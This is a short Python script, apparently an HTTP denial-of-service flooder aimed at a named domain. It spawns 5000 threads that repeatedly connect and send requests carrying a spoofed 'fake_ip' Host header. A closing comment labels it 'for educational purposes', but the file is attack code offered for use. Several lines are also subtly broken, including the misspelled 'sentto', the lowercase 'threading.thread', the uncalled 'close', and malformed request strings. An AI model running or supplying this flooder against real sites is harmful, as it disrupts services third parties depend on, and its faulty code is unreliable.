import threading
import socket

target = 'truthtellereaglefuck.net'
port = 80
fake_ip = '168.20.23.39'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target,port))
        s.sentto(("Host: " + fake_ip + "r\n\r\n").encode('ascii'), (target, port))
        s.close

for i in range(5000):
    thread = threading.thread(target=attack)
    thread.start()


# for educational purposes